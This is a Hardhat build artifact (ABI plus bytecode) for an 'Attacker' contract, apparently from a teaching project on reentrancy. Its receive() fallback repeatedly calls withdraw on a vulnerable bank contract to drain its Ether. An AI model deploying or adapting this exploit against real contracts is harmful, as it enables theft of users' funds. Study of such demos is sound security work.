{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attacker",
  "sourceName": "contracts/ReentrancyAttacker.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_reentrancyBankAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract IReentrancyBank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516106ca3803806106ca8339818101604052810190610032919061011c565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610149565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100e9826100be565b9050919050565b6100f9816100de565b811461010457600080fd5b50565b600081519050610116816100f0565b92915050565b600060208284031215610132576101316100b9565b5b600061014084828501610107565b91505092915050565b610572806101586000396000f3fe6080604052600436106100435760003560e01c806312065fe0146101295780638da5cb5b146101545780639e5faafc1461017f578063f66ad59a1461018957610124565b3661012457670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101225760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016100ef91906103ae565b600060405180830381600087803b15801561010957600080fd5b505af115801561011d573d6000803e3d6000fd5b505050505b005b600080fd5b34801561013557600080fd5b5061013e6101b4565b60405161014b91906103d8565b60405180910390f35b34801561016057600080fd5b506101696101bc565b6040516101769190610434565b60405180910390f35b6101876101e2565b005b34801561019557600080fd5b5061019e61033b565b6040516101ab91906104a4565b60405180910390f35b600047905090565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60003411610225576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161021c9061051c565b60405180910390fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561028d57600080fd5b505af11580156102a1573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b815260040161030791906103ae565b600060405180830381600087803b15801561032157600080fd5b505af1158015610335573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000819050919050565b6000819050919050565b6000819050919050565b600061039861039361038e8461035f565b610373565b610369565b9050919050565b6103a88161037d565b82525050565b60006020820190506103c3600083018461039f565b92915050565b6103d281610369565b82525050565b60006020820190506103ed60008301846103c9565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061041e826103f3565b9050919050565b61042e81610413565b82525050565b60006020820190506104496000830184610425565b92915050565b600061046a610465610460846103f3565b610373565b6103f3565b9050919050565b600061047c8261044f565b9050919050565b600061048e82610471565b9050919050565b61049e81610483565b82525050565b60006020820190506104b96000830184610495565b92915050565b600082825260208201905092915050565b7f4d757374206861766520736f6d6520457468657220746f2061747461636b0000600082015250565b6000610506601e836104bf565b9150610511826104d0565b602082019050919050565b60006020820190508181036000830152610535816104f9565b905091905056fea2646970667358221220ac55322d3b4eecc9e2294e1f780a37570e8966470c51658bf76150ce239f728664736f6c634300081c0033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}